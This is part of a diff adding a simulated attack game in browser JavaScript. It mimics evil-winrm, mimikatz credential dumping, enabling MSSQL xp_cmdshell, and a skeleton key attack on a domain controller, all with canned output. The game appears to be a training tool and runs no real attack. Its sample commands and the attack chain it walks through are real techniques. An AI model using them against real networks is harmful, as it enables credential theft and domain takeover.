+      print('SMB   172.16.1.20  445  FILE01  [*] Windows Server 2019 Build 17763', 'system');
+      print('SMB   172.16.1.20  445  FILE01  [-] YOURCOMPANY\\guest: STATUS_LOGON_FAILURE', 'error');
+      return;
+    }
+
+    print(`Failed to connect to ${target}`, 'error');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // EVIL-WINRM - WINRM SHELL
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'evil-winrm') {
+    const ipArg = args.indexOf('-i');
+    const userArg = args.indexOf('-u');
+    const passArg = args.indexOf('-p');
+
+    const ip = ipArg !== -1 ? args[ipArg + 1] : null;
+    const user = userArg !== -1 ? args[userArg + 1] : null;
+    const pass = passArg !== -1 ? args[passArg + 1] : null;
+
+    if (ip === '172.16.1.20' && state.file01Accessed) {
+      if (user === 'svc_jenkins' && pass === 'J3nk1ns@dm1n!') {
+        await simulateLoading('Connecting via WinRM', 2000);
+        print('');
+        print('Evil-WinRM shell v3.5', 'success');
+        print('Info: Establishing connection to remote endpoint', 'system');
+        print('');
+        print('*Evil-WinRM* PS C:\\Users\\svc_jenkins\\Documents>', 'success');
+
+        state.currentHost = 'FILE01';
+        setPrompt('svc_jenkins', 'FILE01', 'C:\\Users\\svc_jenkins');
+        return;
+      }
+    }
+
+    if (ip === '192.168.100.10' && state.skeletonKeyInjected) {
+      if (user === 'Administrator' && pass === 'mimikatz') {
+        await simulateLoading('Connecting via WinRM (Skeleton Key)', 2000);
+        print('');
+        print('Evil-WinRM shell v3.5', 'success');
+        print('[*] Skeleton key authentication accepted!', 'warning');
+        print('Info: Establishing connection to remote endpoint', 'system');
+        print('');
+        print('*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop>', 'success');
+
+        state.currentHost = 'DC01';
+        state.dcAccessed = true;
+        LEVEL2_NETWORK.hosts['DC01'].compromised = true;
+        state.compromisedHosts.push('DC01');
+        setPrompt('Administrator', 'DC01', 'C:\\Users\\Administrator');
+        playSuccess();
+        return;
+      }
+    }
+
+    print('Error: WinRM connection failed', 'error');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // MIMIKATZ - CREDENTIAL DUMPING
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'mimikatz') {
+    if (state.currentHost !== 'FILE01') {
+      print('[!] Need to be on a Windows host with local admin', 'error');
+      return;
+    }
+
+    await simulateLoading('Dumping credentials with mimikatz', 3000);
+    print('');
+    print('  .#####.   mimikatz 2.2.0 (x64) #19041', 'warning');
+    print(' .## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)', 'warning');
+    print(' ## / \\ ##  /*** Benjamin DELPY `gentilkiwi`', 'warning');
+    print(' ## \\ / ##       > https://blog.gentilkiwi.com', 'warning');
+    print(' \'## v ##\'       Vincent LE TOUX', 'warning');
+    print('  \'#####\'        > https://pingcastle.com ***/', 'warning');
+    print('');
+    print('mimikatz # sekurlsa::logonpasswords', 'system');
+    print('');
+    print('Authentication Id : 0 ; 996 (00000000:000003e4)', 'system');
+    print('Session           : Service from 0', 'system');
+    print('User Name         : sql_svc', 'success');
+    print('Domain            : YOURCOMPANY', 'success');
+    print('Logon Server      : DC01', 'system');
+    print('SID               : S-1-5-21-...', 'system');
+    print('        msv :', 'system');
+    print('         [00000003] Primary', 'system');
+    print('         * Username : sql_svc', 'success');
+    print('         * Domain   : YOURCOMPANY', 'success');
+    print('         * NTLM     : 88ad09182de639ccc6579eb0849751cf', 'success');
+    print('         * SHA1     : ...', 'system');
+    print('');
+    print('Authentication Id : 0 ; 45892 (00000000:0000b344)', 'system');
+    print('User Name         : svc_jenkins', 'system');
+    print('Domain            : YOURCOMPANY', 'system');
+    print('        * NTLM     : 2b576acbe6bcfda7294d6bd18041b8fe', 'system');
+    print('');
+    print('[!] sql_svc credentials captured!', 'success');
+    print('[!] This service account likely has MSSQL access', 'info');
+
+    state.dumpedCreds = true;
+    addEasterEgg('lvl2_mimikatz_dump', 'The kiwi reveals all secrets...');
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // MSSQLCLIENT - DATABASE ACCESS
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'mssqlclient.py' || cmd === 'mssqlclient') {
+    if (!state.dumpedCreds) {
+      print('[!] Need database credentials first', 'error');
+      return;
+    }
+
+    if (fullCmd.includes('172.16.1.50') && fullCmd.includes('sql_svc')) {
+      await simulateLoading('Connecting to MSSQL', 2000);
+      print('');
+      print('Impacket v0.10.0 - MSSQL Client', 'system');
+      print('[*] Encryption required, switching to TLS', 'system');
+      print('[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master', 'system');
+      print('[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english', 'system');
+      print('[*] ACK: Result: 1 - Microsoft SQL Server', 'system');
+      print('[!] Press help for extra shell commands', 'system');
+      print('');
+      print('SQL>', 'success');
+
+      state.mssqlAccessed = true;
+      state.currentHost = 'DB01-SQL';
+      setPrompt('sql_svc', 'DB01', 'SQL');
+      autosave();
+      return;
+    }
+
+    print('Error: Connection failed', 'error');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // SQL COMMANDS (when in MSSQL shell)
+  // ═══════════════════════════════════════════════════════════════
+  if (state.currentHost === 'DB01-SQL') {
+    if (cmd === 'enable_xp_cmdshell') {
+      await sleep(500);
+      print('[*] EXEC sp_configure \'show advanced options\', 1; RECONFIGURE;', 'system');
+      print('[*] EXEC sp_configure \'xp_cmdshell\', 1; RECONFIGURE;', 'system');
+      print('[+] xp_cmdshell enabled!', 'success');
+      state.xpCmdEnabled = true;
+      return;
+    }
+
+    if (cmd === 'xp_cmdshell') {
+      if (!state.xpCmdEnabled) {
+        print('[!] xp_cmdshell is disabled. Run: enable_xp_cmdshell', 'error');
+        return;
+      }
+
+      const shellCmd = args.join(' ');
+
+      if (shellCmd === 'whoami') {
+        print('output', 'system');
+        print('------', 'system');
+        print('nt authority\\system', 'success');
+        print('');
+        print('[!] SYSTEM level access on DB01!', 'success');
+        state.db01Shell = true;
+        state.currentHost = 'DB01';
+        state.coreAccessible = true;
+        LEVEL2_NETWORK.hosts['DB01'].compromised = true;
+        state.compromisedHosts.push('DB01');
+
+        print('[!] DB01 can reach CORE network segment (192.168.100.0/24)', 'warning');
+        setPrompt('SYSTEM', 'DB01', 'C:\\');
+        playSuccess();
+        autosave();
+        return;
+      }
+
+      print(`Executing: ${shellCmd}`, 'system');
+      return;
+    }
+
+    if (cmd === 'select' || cmd === 'SELECT') {
+      print('(rows affected: 0)', 'system');
+      return;
+    }
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // SKELETON KEY ATTACK
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'skeleton') {
+    if (state.currentHost !== 'DB01') {
+      print('[!] Need SYSTEM on a domain-joined host that can reach DC', 'error');
+      return;
+    }
+
+    if (!state.coreAccessible) {
+      print('[!] Cannot reach Domain Controller from current position', 'error');
+      return;
+    }
+
+    print('');
+    print('╔════════════════════════════════════════════════════════════════╗', 'error');
+    print('║            ⚠️  SKELETON KEY ATTACK  ⚠️                          ║', 'error');
+    print('╠════════════════════════════════════════════════════════════════╣', 'error');
+    print('║  This attack patches LSASS on the Domain Controller to        ║', 'warning');
+    print('║  accept a master password ("mimikatz") for any user.          ║', 'warning');
+    print('║                                                                ║', 'info');
+    print('║  WARNING: This modifies DC memory - detected by modern EDR    ║', 'warning');
+    print('║  WARNING: Requires restart to remove                          ║', 'warning');
+    print('╚════════════════════════════════════════════════════════════════╝', 'error');
+    print('');
+
+    await simulateLoading('Injecting skeleton key into DC01 LSASS', 4000);
+
+    print('');
+    print('[*] misc::skeleton', 'system');
+    print('[+] \'cryptprimitives.dll\' loaded!', 'system');
+    print('[+] Key schedule created!', 'system');
+    print('[+] Skeleton Key injected successfully!', 'success');
+    print('');
+    print('╔════════════════════════════════════════════════════════════════╗', 'success');
+    print('║  SKELETON KEY ACTIVE                                           ║', 'success');
+    print('║  Master password: mimikatz                                     ║', 'success');
+    print('║  Use any username with password "mimikatz" to authenticate     ║', 'success');
+    print('╚════════════════════════════════════════════════════════════════╝', 'success');
+    print('');
+    print('[*] Try: evil-winrm -i 192.168.100.10 -u Administrator -p mimikatz', 'info');
+
+    state.skeletonKeyInjected = true;
+    playAlert();
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // SESSION MANAGEMENT
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'sessions') {
+    print('');
+    print('Active Sessions:', 'info');
+    print('  [0] attacker    - Kali Linux (you)', 'system');
+    if (state.gotWebShell) print('  [1] WEB01       - jenkins@10.10.10.15 (Linux)', 'success');
+    if (state.file01Accessed) print('  [2] FILE01      - svc_jenkins@172.16.1.20 (Windows)', 'success');
+    if (state.db01Shell) print('  [3] DB01        - SYSTEM@172.16.1.50 (Windows)', 'success');
+    if (state.dcAccessed) print('  [4] DC01        - Administrator@192.168.100.10 (Windows)', 'success');
+    print('');
+    print(`Current: ${state.currentHost}`, 'warning');
+    return;
+  }
+
+  if (cmd === 'session') {
+    const target = args[0];
+
+    if (target === 'attacker' || target === '0') {
+      state.currentHost = 'attacker';
+      setPrompt('root', 'kali', '~');
+      print('[*] Switched to attacker session', 'system');
+      return;
+    }
+
+    if ((target === 'WEB01' || target === '1') && state.gotWebShell) {
+      state.currentHost = 'WEB01';
+      setPrompt('jenkins', 'WEB01', '/var/lib/jenkins');
+      print('[*] Switched to WEB01 session', 'system');
+      return;
+    }
+
+    if ((target === 'FILE01' || target === '2') && state.file01Accessed) {
+      state.currentHost = 'FILE01';
+      setPrompt('svc_jenkins', 'FILE01', 'C:\\Users\\svc_jenkins');
+      print('[*] Switched to FILE01 session', 'system');
+      return;
+    }
+
+    if ((target === 'DB01' || target === '3') && state.db01Shell) {
+      state.currentHost = 'DB01';
+      setPrompt('SYSTEM', 'DB01', 'C:\\');
+      print('[*] Switched to DB01 session', 'system');
+      return;
+    }
+
+    if ((target === 'DC01' || target === '4') && state.dcAccessed) {
+      state.currentHost = 'DC01';
+      setPrompt('Administrator', 'DC01', 'C:\\Users\\Administrator');
+      print('[*] Switched to DC01 session', 'system');
+      return;
+    }
+
+    print('Invalid or unavailable session', 'error');
+    return;
+  }
+
+  if (cmd === 'background') {
+    state.currentHost = 'attacker';
+    setPrompt('root', 'kali', '~');
+    print('[*] Session backgrounded. Returned to attacker.', 'system');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // SEARCHSPLOIT
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'searchsploit') {
+    const term = args.join(' ').toLowerCase();
+
+    if (term.includes('jenkins')) {
+      print('───────────────────────────────────────────────────────────────', 'system');
+      print(' Exploit Title                            |  Path', 'info');
+      print('───────────────────────────────────────────────────────────────', 'system');
+      print(' Jenkins < 2.442 - Script Console RCE    | java/webapps/51993.py', 'success');
+      print(' Jenkins 2.x - Groovy Script Exec        | java/webapps/49658.py', 'system');
+      print(' Jenkins CI - Remote Code Execution      | java/webapps/24206.py', 'system');
+      print('───────────────────────────────────────────────────────────────', 'system');
+      return;
+    }
+
+    print('No results found', 'system');
+    return;
+  }
+
+  print(`Command not found: ${cmd}`, 'error');
+}
+
+// ═══════════════════════════════════════════════════════════════
+// HELPER FUNCTIONS
+// ═══════════════════════════════════════════════════════════════
+
+function calculateLevel2Progress(state) {
+  let progress = 0;
+
+  // Phase 1 (25%)
+  if (state.webScanned) progress += 5;
+  if (state.foundJenkins) progress += 5;
+  if (state.gotWebShell) progress += 10;
+  if (state.foundCreds) progress += 5;
+
+  // Phase 2 (15%)
+  if (state.uploadedChisel) progress += 5;
+  if (state.tunnelEstablished) progress += 10;
+
+  // Phase 3 (20%)
+  if (state.file01Accessed) progress += 10;
+  if (state.dumpedCreds) progress += 10;
+
+  // Phase 4 (20%)
+  if (state.mssqlAccessed) progress += 10;
+  if (state.db01Shell) progress += 10;
+
+  // Phase 5 (20%)
+  if (state.skeletonKeyInjected) progress += 10;
+  if (state.domainAdmin) progress += 10;
+
+  return progress;
+}
+
+function printLevel2NetworkMap(state) {
+  print('');
+  print('╔══════════════════════════════════════════════════════════════════════════════╗', 'info');
+  print('║                           NETWORK TOPOLOGY                                   ║', 'info');
+  print('╠══════════════════════════════════════════════════════════════════════════════╣', 'info');
+  print('║                                                                              ║', 'info');
+  print('║   EXTERNAL              DMZ                 INTERNAL              CORE       ║', 'info');
+  print('║   ────────              ───                 ────────              ────       ║', 'info');
+
+  const web = state.compromisedHosts.includes('WEB01') ? '✓' : (state.webScanned ? '○' : '?');
+  const file = state.compromisedHosts.includes('FILE01') ? '✓' : (state.file01Scanned ? '○' : '?');
+  const db = state.compromisedHosts.includes('DB01') ? '✓' : (state.db01Scanned ? '○' : '?');
+  const dc = state.compromisedHosts.includes('DC01') ? '✓' : '?';
+
+  print(`║   ┌────────┐       ┌────────┐         ┌────────┐         ┌────────┐          ║`, 'info');
+  print(`║   │ATTACKER│──────▶│ WEB01  │────────▶│ FILE01 │         │  DC01  │          ║`, 'info');
+  print(`║   │  KALI  │ HTTP  │[${web}]     │ Pivot  │[${file}]     │         │[${dc}]     │          ║`, state.compromisedHosts.includes('WEB01') ? 'success' : 'system');
+  print(`║   └────────┘       └────────┘         └────────┘         └────────┘          ║`, 'info');
+  print('║        │               │                   │                  ▲              ║', 'info');
+  print('║        │               │                   │                  │              ║', 'info');
+  print('║        │               │              ┌────────┐              │              ║', 'info');
+  print(`║        │               │              │  DB01  │──────────────┘              ║`, 'info');
+  print(`║        │               │              │[${db}]     │  CORE Access              ║`, state.compromisedHosts.includes('DB01') ? 'success' : 'system');
+  print('║        │               │              └────────┘                             ║', 'info');
+  print('║                                                                              ║', 'info');
+  print('╠══════════════════════════════════════════════════════════════════════════════╣', 'info');
+  print('║  LEGEND: [✓] Compromised  [○] Scanned  [?] Unknown                           ║', 'system');
+  print('╠══════════════════════════════════════════════════════════════════════════════╣', 'info');
+  print('║  HOST DETAILS:                                                               ║', 'info');
+  print('║    10.10.10.15   WEB01   Ubuntu 22.04    Jenkins CI (DMZ)                   ║', state.compromisedHosts.includes('WEB01') ? 'success' : 'system');
+  print('║    172.16.1.20   FILE01  Server 2019     File Server (Internal)             ║', state.compromisedHosts.includes('FILE01') ? 'success' : 'system');
+  print('║    172.16.1.50   DB01    Server 2019     MSSQL Server (Internal)            ║', state.compromisedHosts.includes('DB01') ? 'success' : 'system');
+  print('║    192.168.100.10 DC01   Server 2022     Domain Controller (Core)           ║', state.compromisedHosts.includes('DC01') ? 'success' : 'system');
+  print('╠══════════════════════════════════════════════════════════════════════════════╣', 'info');
+
+  if (state.tunnelEstablished) {
+    print('║  ACTIVE TUNNELS:                                                             ║', 'info');
+    print('║    [SOCKS5] 127.0.0.1:1080 ──▶ WEB01 ──▶ 172.16.1.0/24                      ║', 'success');
+  } else {
+    print('║  ACTIVE TUNNELS: None                                                        ║', 'system');
+  }
+
+  print('╚══════════════════════════════════════════════════════════════════════════════╝', 'info');
+  print('');
+}
+</script>
